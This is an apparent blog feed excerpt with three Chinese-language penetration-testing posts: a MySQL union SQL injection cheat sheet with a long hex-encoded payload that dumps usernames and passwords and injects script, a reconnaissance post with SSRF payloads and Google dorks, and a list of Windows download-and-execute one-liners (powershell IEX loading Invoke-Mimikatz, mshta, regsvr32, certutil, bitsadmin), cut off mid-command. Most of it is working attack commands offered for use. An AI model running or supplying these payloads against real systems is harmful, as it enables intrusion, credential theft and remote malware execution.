    <id>http://www.7wawa.com/2019/10/24/mysql%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/</id>
    <published>2019-10-24T07:50:30.000Z</published>
    <updated>2019-10-27T10:50:21.399Z</updated>
    
    <content type="html"><![CDATA[<h2 id="MySQL报错注入"><a href="#MySQL报错注入" class="headerlink" title="MySQL报错注入"></a>MySQL报错注入</h2><p>查询报错字段数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&apos;  order by 3 --+  order by</span><br></pre></td></tr></table></figure><a id="more"></a><p>查询当前使用的数据库和基本信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&apos; union select 1,2,concat_ws(char(32,58,32),user(),database(),version()) --+</span><br></pre></td></tr></table></figure><p>查询数据库security的表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&apos; union select 1,2,group_concat(table_name) from information_schema.tables where  table_schema=0x7365637572697479 --+</span><br></pre></td></tr></table></figure><p>查询数据库security的表user下的列字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&apos; union select 1,2,group_concat(column_name) from information_schema.columns where  table_name=0x7573657273 --+</span><br></pre></td></tr></table></figure><p>查询值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&apos; union select 1,2,concat_ws(char(32,58,32),username,password) from users --+</span><br></pre></td></tr></table></figure><p>sqli god syntax</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">concat(0x3c7363726970743e6e616d653d70726f6d70742822506c6561736520456e74657220596f7572204e616d65203a2022293b2075726c3d70726f6d70742822506c6561736520456e746572205468652055726c20796f7527726520747279696e6720746f20496e6a65637420616e6420777269746520276d616b6d616e2720617420796f757220496e6a656374696f6e20506f696e742c204578616d706c65203a20687474703a2f2f736974652e636f6d2f66696c652e7068703f69643d2d3420554e494f4e2053454c45435420312c322c332c636f6e6361742830783664363136622c6d616b6d616e292c352d2d2b2d204e4f5445203a204a757374207265706c61636520796f757220496e6a656374696f6e20706f696e742077697468206b6579776f726420276d616b6d616e2722293b3c2f7363726970743e,0x3c623e3c666f6e7420636f6c6f723d7265643e53514c69474f44732053796e746178205620312e30204279204d616b4d616e3c2f666f6e743e3c62723e3c62723e3c666f6e7420636f6c6f723d677265656e2073697a653d343e496e6a6563746564206279203c7363726970743e646f63756d656e742e7772697465286e616d65293b3c2f7363726970743e3c2f666f6e743e3c62723e3c7461626c6520626f726465723d2231223e3c74723e3c74643e44422056657273696f6e203a203c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75653e20,version(),0x203c2f666f6e743e3c2f74643e3c2f74723e3c74723e3c74643e2044422055736572203a203c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75653e20,user(),0x203c2f666f6e743e3c2f74643e3c2f74723e3c74723e3c74643e5072696d617279204442203a203c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75653e20,database(),0x203c2f74643e3c2f74723e3c2f7461626c653e3c62723e,0x3c666f6e7420636f6c6f723d626c75653e43686f6f73652061207461626c652066726f6d207468652064726f70646f776e206d656e75203a203c2f666f6e743e3c62723e,concat(0x3c7363726970743e66756e6374696f6e20746f48657828737472297b76617220686578203d27273b666f722876617220693d303b693c7374722e6c656e6774683b692b2b297b686578202b3d2027272b7374722e63686172436f646541742869292e746f537472696e67283136293b7d72657475726e206865783b7d66756e6374696f6e2072656469726563742873697465297b6d616b73706c69743d736974652e73706c697428222e22293b64626e616d653d6d616b73706c69745b305d3b74626c6e616d653d6d616b73706c69745b315d3b6d616b7265703d22636f6e636174284946284074626c3a3d3078222b746f4865782874626c6e616d65292b222c3078302c307830292c4946284064623a3d3078222b746f4865782864626e616d65292b222c3078302c307830292c636f6e6361742830783363373336333732363937303734336537353732366333643232222b746f4865782875726c292b2232323362336332663733363337323639373037343365292c636f6e63617428636f6e6361742830783363373336333732363937303734336536343632336432322c4064622c307832323362373436323663336432322c4074626c2c3078323233623363326637333633373236393730373433652c30783363363233653363363636663665373432303633366636633666373233643732363536343365323035333531346336393437346634343733323035333739366537343631373832303536323033313265333032303432373932303464363136623464363136653363326636363666366537343365336336323732336533633632373233653534363136323663363532303465363136643635323033613230336336363666366537343230363336663663366637323364363236633735363533652c4074626c2c3078336332663636366636653734336532303636373236663664323036343631373436313632363137333635323033613230336336363666366537343230363336663663366637323364363236633735363533652c4064622c307833633266363636663665373433653363363237323365346537353664363236353732323034663636323034333666366337353664366537333230336132303363363636663665373432303633366636633666373233643632366337353635336533633733363337323639373037343365363336663663363336653734336432322c2853454c45435420636f756e7428636f6c756d6e5f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73207768657265207461626c655f736368656d613d40646220616e64207461626c655f6e616d653d4074626c292c3078323233623634366636333735366436353665373432653737373236393734363532383633366636633633366537343239336233633266373336333732363937303734336533633266363636663665373433652c307833633632373233652c2873656c65637420284078292066726f6d202873656c656374202840783a3d30783030292c284063686b3a3d31292c202873656c656374202830292066726f6d2028696e666f726d6174696f6e5f736368656d612e636f6c756d6e732920776865726520287461626c655f736368656d613d3078222b746f4865782864626e616d65292b222920616e6420287461626c655f6e616d653d3078222b746f4865782874626c6e616d65292b222920616e642028307830302920696e202840783a3d636f6e6361745f777328307832302c40782c4946284063686b3d312c30783363373336333732363937303734336532303633366636633665363136643635323033643230366536353737323034313732373236313739323832393362323037363631373232303639323033643230333133622c30783230292c30783230363336663663366536313664363535623639356432303364323032322c636f6c756d6e5f6e616d652c307832323362323036393262326233622c4946284063686b3a3d322c307832302c30783230292929292978292c30783636366637323238363933643331336236393363336436333666366336333665373433623639326232623239376236343666363337353664363536653734326537373732363937343635323832323363363636663665373432303633366636633666373233643637373236353635366533653232326236393262323232653230336332663636366636653734336532323262363336663663366536313664363535623639356432623232336336323732336532323239336237643363326637333633373236393730373433652c636f6e6361742830783363363233652cb75726c3d75726c2e7265706c616365282227222c2225323722293b75726c706173313d75726c2e7265706c61636528226d616b6d616e222c6d616b726570293b77696e646f772e6f70656e2875726c70617331293b7d3c2f7363726970743e3c73656c656374206f6e6368616e67653d22726564697265637428746869732e76616c756529223e3c6f7074696f6e2076616c75653d226d6b6e6f6e65222073656c65637465643e43686f6f73652061205461626c653c2f6f7074696f6e3e,(<span class="keyword">select</span> (@x) <span class="keyword">from</span> (<span class="keyword">select</span> (@x:=<span class="number">0x00</span>), (<span class="keyword">select</span> (<span class="number">0</span>) <span class="keyword">from</span> (information_schema.tables) <span class="keyword">where</span> (table_schema!=<span class="number">0x696e666f726d6174696f6e5f736368656d61</span>) <span class="keyword">and</span> (<span class="number">0x00</span>) <span class="keyword">in</span> (@x:=<span class="keyword">concat</span>(@x,<span class="number">0x3c6f7074696f6e2076616c75653d22</span>,<span class="keyword">UNHEX</span>(<span class="keyword">HEX</span>(table_schema)),<span class="number">0x2e</span>,<span class="keyword">UNHEX</span>(<span class="keyword">HEX</span>(table_name)),<span class="number">0x223e</span>,<span class="keyword">UNHEX</span>(<span class="keyword">HEX</span>(<span class="keyword">concat</span>(<span class="number">0x4461746162617365203a3a20</span>,table_schema,<span class="number">0x203a3a205461626c65203a3a20</span>,table_name))),<span class="number">0x3c2f6f7074696f6e3e</span>))))x),<span class="number">0x3c2f73656c6563743e</span>),<span class="number">0x3c62723e3c62723e3c62723e3c62723e3c62723e</span>)</span><br></pre></td></tr></table></figure><p><a href="http://cike.com/Less-1/?id=-1%27%20union%20select%201,2,makman%20--+" target="_blank" rel="noopener">http://cike.com/Less-1/?id=-1%27%20union%20select%201,2,makman%20--+</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;MySQL报错注入&quot;&gt;&lt;a href=&quot;#MySQL报错注入&quot; class=&quot;headerlink&quot; title=&quot;MySQL报错注入&quot;&gt;&lt;/a&gt;MySQL报错注入&lt;/h2&gt;&lt;p&gt;查询报错字段数&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;id=1&amp;apos;  order by 3 --+  order by&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>Web渗透测试之信息刺探</title>
    <link href="http://www.7wawa.com/2019/10/24/%E4%BF%A1%E6%81%AF%E6%8C%96%E6%8E%98/"/>
    <id>http://www.7wawa.com/2019/10/24/%E4%BF%A1%E6%81%AF%E6%8C%96%E6%8E%98/</id>
    <published>2019-10-24T07:50:30.000Z</published>
    <updated>2019-10-27T10:50:44.672Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Web渗透测试之信息刺探"><a href="#Web渗透测试之信息刺探" class="headerlink" title="Web渗透测试之信息刺探"></a>Web渗透测试之信息刺探</h2><h5 id="http-协议基础"><a href="#http-协议基础" class="headerlink" title="http 协议基础"></a>http 协议基础</h5><p><img src="https://i.loli.net/2019/01/11/5c3864a6c9873.png" alt=""></p><a id="more"></a><p><img src="https://i.loli.net/2019/01/11/5c3864d27cf50.png" alt=""></p><hr><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">url = <span class="string">'www.sina.com.cn'</span></span><br><span class="line">port = <span class="number">80</span></span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">sock.connect((url, port))</span><br><span class="line">request_url = <span class="string">'GET / HTTP/1.1\r\nHost: www.sina.com.cn\r\nConnection: close\r\n\r\n'</span></span><br><span class="line">sock.send(request_url.encode())</span><br><span class="line">response = <span class="string">b''</span></span><br><span class="line">rec = sock.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">while</span> rec:</span><br><span class="line">    response += rec</span><br><span class="line">    rec = sock.recv(<span class="number">1024</span>)</span><br><span class="line">print(response.decode())</span><br></pre></td></tr></table></figure><p>原因是HTTP 1.1协议中，默认connection: keep-alive。</p><hr><p><em>Connection: keep-alive   当一个网页打开完成后，客户端和服务器之间用于传输HTTP数据的TCP连接不会关闭，如果客户端再次访问这个服务器上的网页，会继续使用这一条已经建立的连接</em></p><p><em>Connection: close  代表一个Request完成后，客户端和服务器之间用于传输HTTP数据的TCP连接会关闭， 当客户端再次发送Request，需要重新建立TCP连接。</em></p><p>1.URL的构成</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Scheme:[//[user[:password]@]host[:port]][/path][?query][#fragment]</span><br></pre></td></tr></table></figure><hr><p>2.URL的响应状态码</p><p>200 301  302  500  501  403  404</p><p>3.协议部分(http,https,ftp,dict,gopher,file,smb,mailto,data……….)</p><p>4.域名部分(域名或者IP地址)</p><p>5.文件路径(/path/to/myfile.html)</p><p>6.参数部分以？开始#结束</p><p><a href="http://cike:cike123@baidu.com/cike.php?name=cike&amp;pass=123" target="_blank" rel="noopener">http://cike:cike123@baidu.com/cike.php?name=</a><a href="http://cike:cike123@baidu.com/cike.php?name=cike&amp;pass=123" target="_blank" rel="noopener">cike&amp;pass</a><a href="http://cike:cike123@baidu.com/cike.php?name=cike&amp;pass=123" target="_blank" rel="noopener">=123</a></p><p>http:<a href="mailto://@qq.com" target="_blank" rel="noopener">//@qq.com</a>/7wawa.com</p><hr><p><a href="http://7wawa.com@qq.com/" target="_blank" rel="noopener">http://7wawa.com@qq.com</a></p><p><a href="http://foo.bar.127.0.0.1.xip.io/" target="_blank" rel="noopener">http://foo.bar.127.0.0.1.xip.io</a><a href="http://foo.bar.127.0.0.1.xip.io/" target="_blank" rel="noopener">/</a> </p><p><a href="http://222.82.215.212.xip.io/" target="_blank" rel="noopener">http://222.82.215.212.xip.io/</a></p><p><a href="http://222.82.215.212:19900" target="_blank" rel="noopener">http://222.82.215.212:19900</a></p><p><a href="http://2130706433/" target="_blank" rel="noopener">http://2130706433/</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Dict://</span><br><span class="line">dict://&lt;user-auth&gt;@&lt;host&gt;:&lt;port&gt;/d:&lt;word&gt;</span><br><span class="line">ssrf.php?url=dict://attacker:11111/</span><br><span class="line">SFTP://</span><br><span class="line">ssrf.php?url=sftp://example.com:11111/</span><br><span class="line">TFTP://</span><br><span class="line">ssrf.php?url=tftp://example.com:12346/TESTUDPPACKET</span><br><span class="line">LDAP://</span><br><span class="line">ssrf.php?url=ldap://localhost:11211/%0astats%0aquit</span><br><span class="line">Gopher://</span><br><span class="line">ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a</span><br></pre></td></tr></table></figure><hr><p>•127。0。0。1  &gt;&gt;&gt;  127.0.0.1</p><h2 id="敏感文件刺探"><a href="#敏感文件刺探" class="headerlink" title="敏感文件刺探"></a>敏感文件刺探</h2><p>利用    御剑 wfuzz dirb</p><p>.git    .idea   .svn  .bash  .bak  .rar .xml</p><hr><p>简单的目录探测原理：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dir_check</span><span class="params">(url)</span>:</span></span><br><span class="line"><span class="keyword">return</span> requests.get(url, stream=<span class="keyword">True</span>, headers=headers, timeout=timeout, proxies=proxies, allow_redirects=allow_redirects)</span><br><span class="line"></span><br><span class="line">results = dir_check(url)</span><br><span class="line"><span class="keyword">if</span> results.status_code == requests.codes.ok:</span><br><span class="line">print(url)</span><br></pre></td></tr></table></figure><hr><h2 id="google-hacker语法"><a href="#google-hacker语法" class="headerlink" title="google-hacker语法"></a>google-hacker语法</h2><p>inurl:”cike” 搜索URL当中含有cike 字符串的域名</p><p>site:7wawa.com   搜索特定的网站</p><p>filetype:docx    搜索文件类型</p><p>ext:docx  搜索文件类型</p><p>intext:搜索正文字符串</p><p>intitle:搜索网页标题</p><p><a href="https://www.exploit-db.com/google-hacking-database" target="_blank" rel="noopener">https://www.exploit-db.com/google-hacking-database</a></p><p>比如搜索weblogic</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">inurl:wls-wsat intext:&quot;weblogic.wsee.wstx.wsat&quot;</span><br><span class="line">intitle:&quot;WebLogic Server&quot; intitle:&quot;Console Login&quot; inurl:console</span><br></pre></td></tr></table></figure><hr><h2 id="端口服务扫描"><a href="#端口服务扫描" class="headerlink" title="端口服务扫描"></a>端口服务扫描</h2><p>工具有：</p><p>nmap   zmap   masscan     iisput   </p><p>根据端口服务，识别目标系统指纹。</p><p>谷歌浏览器插件 shodan</p><hr><h2 id="子域名挖掘"><a href="#子域名挖掘" class="headerlink" title="子域名挖掘"></a>子域名挖掘</h2><p>工具：</p><p>subDomainsBrute</p><p>ESD</p><p>Sublist3r</p><p> 外加谷歌搜索语法</p><hr><h2 id="整个流程："><a href="#整个流程：" class="headerlink" title="整个流程："></a>整个流程：</h2><p>域名 &gt;&gt;&gt;&gt;&gt;&gt;&gt;子域名 &gt;&gt;&gt;&gt;子域名IP&gt;&gt;&gt;&gt;&gt;确认目标IP资产(可以扩大到整个 c 段) &gt;&gt;&gt;&gt;&gt;端口扫描&gt;&gt;&gt;&gt;&gt;资产服务确认&gt;&gt;&gt;&gt;&gt; 敏感文件挖掘 &gt;&gt;&gt;&gt;&gt;&gt;整理资产&gt;&gt;&gt;&gt;进一步完成后续渗透</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Web渗透测试之信息刺探&quot;&gt;&lt;a href=&quot;#Web渗透测试之信息刺探&quot; class=&quot;headerlink&quot; title=&quot;Web渗透测试之信息刺探&quot;&gt;&lt;/a&gt;Web渗透测试之信息刺探&lt;/h2&gt;&lt;h5 id=&quot;http-协议基础&quot;&gt;&lt;a href=&quot;#http-协议基础&quot; class=&quot;headerlink&quot; title=&quot;http 协议基础&quot;&gt;&lt;/a&gt;http 协议基础&lt;/h5&gt;&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2019/01/11/5c3864a6c9873.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>windows下载执行命令大全</title>
    <link href="http://www.7wawa.com/2019/01/21/windows%E4%B8%8B%E8%BD%BD%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E5%A4%A7%E5%85%A8/"/>
    <id>http://www.7wawa.com/2019/01/21/windows%E4%B8%8B%E8%BD%BD%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E5%A4%A7%E5%85%A8/</id>
    <published>2019-01-21T10:03:19.000Z</published>
    <updated>2020-09-03T04:30:52.016Z</updated>
    
    <content type="html"><![CDATA[<h3 id="1-bitsadmin命令（只能命令下载到指定路径上，win7以上）："><a href="#1-bitsadmin命令（只能命令下载到指定路径上，win7以上）：" class="headerlink" title="1.bitsadmin命令（只能命令下载到指定路径上，win7以上）："></a>1.bitsadmin命令（只能命令下载到指定路径上，win7以上）：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /transfer myDownLoadJob /download /priority normal &quot;http://img5.cache.netease.com/photo/0001/2013-03-28/8R1BK3QO3R710001.jpg&quot; &quot;d:\abc.jpg&quot;</span><br><span class="line">bitsadmin /transfer d90f http://site.com/a %APPDATA%\d90f.exe&amp;%APPDATA%\d90f.exe&amp;del %APPDATA%\d90f.exe</span><br></pre></td></tr></table></figure><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用windows defender下载 C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2008.9-0\MpCmdRun.exe -url http://baidu.com/1.exe -path c:\1.exe</span><br></pre></td></tr></table></figure><h3 id="2-powershell命名下载执行：（win7以上）"><a href="#2-powershell命名下载执行：（win7以上）" class="headerlink" title="2.powershell命名下载执行：（win7以上）"></a>2.powershell命名下载执行：（win7以上）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&apos;); Invoke-Mimikatz</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">powershell -exec bypass -f \\webdavserver\folder\payload.ps1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">powershell (new-object System.Net.WebClient).DownloadFile( ‘http://192.168.168.183/1.exe’,’C:\111111111111111.exe’)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">powershell -w hidden -c (new-object System.Net.WebClient).Downloadfile(&apos;http://img5.cache.netease.com/photo/0001/2013-03-28/8R1BK3QO3R710001.jpg&apos;,&apos;d:\\1.jpg&apos;)</span><br></pre></td></tr></table></figure><h3 id="3-mshta命令下载执行"><a href="#3-mshta命令下载执行" class="headerlink" title="3.mshta命令下载执行"></a>3.mshta命令下载执行</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mshta vbscript:Close(Execute(&quot;GetObject(&quot;&quot;script:http://webserver/payload.sct&quot;&quot;)&quot;))</span><br><span class="line"></span><br><span class="line">mshta http://webserver/payload.hta ---&gt;短域名：http://sina.lt/--&gt;mshta http://t.cn/RYUQyF8</span><br><span class="line"></span><br><span class="line">mshta \\webdavserver\folder\payload.hta</span><br></pre></td></tr></table></figure><p>payload.hta</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;HTML&gt;</span><br><span class="line"></span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;HEAD&gt;</span><br><span class="line"></span><br><span class="line">&lt;script language=&quot;VBScript&quot;&gt;</span><br><span class="line"></span><br><span class="line">Window.ReSizeTo 0, 0</span><br><span class="line"></span><br><span class="line">Window.moveTo -2000,-2000</span><br><span class="line"></span><br><span class="line">Set objShell = CreateObject(&quot;Wscript.Shell&quot;)</span><br><span class="line"></span><br><span class="line">objShell.Run &quot;calc.exe&quot;</span><br><span class="line"></span><br><span class="line">self.close</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">demo</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/HEAD&gt;</span><br><span class="line"></span><br><span class="line">&lt;/HTML&gt;</span><br></pre></td></tr></table></figure><h3 id="4-rundll32命令下载执行"><a href="#4-rundll32命令下载执行" class="headerlink" title="4.rundll32命令下载执行"></a>4.rundll32命令下载执行</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rundll32 \\webdavserver\folder\payload.dll,entrypoint</span><br><span class="line"></span><br><span class="line">rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication&quot;;o=GetObject(&quot;script:http://webserver/payload.sct&quot;);window.close();</span><br></pre></td></tr></table></figure><p>参考：<a href="https://github.com/3gstudent/Javascript-Backdoor" target="_blank" rel="noopener">https://github.com/3gstudent/Javascript-Backdoor</a></p><h3 id="5-net中的regasm命令下载执行"><a href="#5-net中的regasm命令下载执行" class="headerlink" title="5.net中的regasm命令下载执行"></a>5.net中的regasm命令下载执行</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\folder\payload.dll</span><br></pre></td></tr></table></figure><h3 id="6-cmd的远程命令下载："><a href="#6-cmd的远程命令下载：" class="headerlink" title="6.cmd的远程命令下载："></a>6.cmd的远程命令下载：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd.exe /k &lt; \\webdavserver\folder\batchfile.txt</span><br></pre></td></tr></table></figure><h3 id="7-regsvr32命令下载执行"><a href="#7-regsvr32命令下载执行" class="headerlink" title="7.regsvr32命令下载执行"></a>7.regsvr32命令下载执行</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll</span><br><span class="line"></span><br><span class="line">regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll</span><br><span class="line"></span><br><span class="line">regsvr32 /u /s /i:http://site.com/js.png scrobj.dll</span><br></pre></td></tr></table></figure><p>js.png</p><p><a href="javascript:void(0" target="_blank" rel="noopener"><img src="http://common.cnblogs.com/images/copycode.gif" alt="复制代码"></a>;)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?XML version=&quot;1.0&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;scriptlet&gt;</span><br><span class="line"></span><br><span class="line">&lt;registration</span><br><span class="line"></span><br><span class="line">    progid=&quot;ShortJSRAT&quot;</span><br><span class="line"></span><br><span class="line">    classid=&quot;&#123;10001111-0000-0000-0000-0000FEEDACDC&#125;&quot; &gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- Learn from Casey Smith @subTee --&gt;</span><br><span class="line"></span><br><span class="line">    &lt;script language=&quot;JScript&quot;&gt;</span><br><span class="line"></span><br><span class="line">        &lt;![CDATA[</span><br><span class="line"></span><br><span class="line">            ps  = &quot;cmd.exe /c calc.exe&quot;;</span><br><span class="line"></span><br><span class="line">            new ActiveXObject(&quot;WScript.Shell&quot;).Run(ps,0,true);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">        ]]&gt;</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;/registration&gt;</span><br><span class="line"></span><br><span class="line">&lt;/scriptlet&gt;</span><br></pre></td></tr></table></figure><p><a href="javascript:void(0" target="_blank" rel="noopener"><img src="http://common.cnblogs.com/images/copycode.gif" alt="复制代码"></a>;)</p><h3 id="8-certutil命令下载执行"><a href="#8-certutil命令下载执行" class="headerlink" title="8.certutil命令下载执行"></a>8.certutil命令下载执行</h3><p><a href="javascript:void(0" target="_blank" rel="noopener"><img src="http://common.cnblogs.com/images/copycode.gif" alt="复制代码"></a>;)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f http://webserver/payload payload</span><br><span class="line"></span><br><span class="line">certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 &amp; certutil -decode payload.b64 payload.dll &amp; C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 &amp; certutil -decode payload.b64 payload.exe &amp; payload.exe</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">certutil -urlcache -split -f http://site.com/a a.exe &amp;&amp; a.exe &amp;&amp;  del a.exe &amp;&amp; certutil -urlcache -split -f http://192.168.254.102:80/a delete</span><br></pre></td></tr></table></figure><p><a href="javascript:void(0" target="_blank" rel="noopener"><img src="http://common.cnblogs.com/images/copycode.gif" alt="复制代码"></a>;)</p><h3 id="9-net中的MSBulid命令下载执行"><a href="#9-net中的MSBulid命令下载执行" class="headerlink" title="9.net中的MSBulid命令下载执行"></a>9.net中的MSBulid命令下载执行</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd /V /c &quot;set MB=&quot;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe&quot; &amp; !MB! /noautoresponse /preprocess 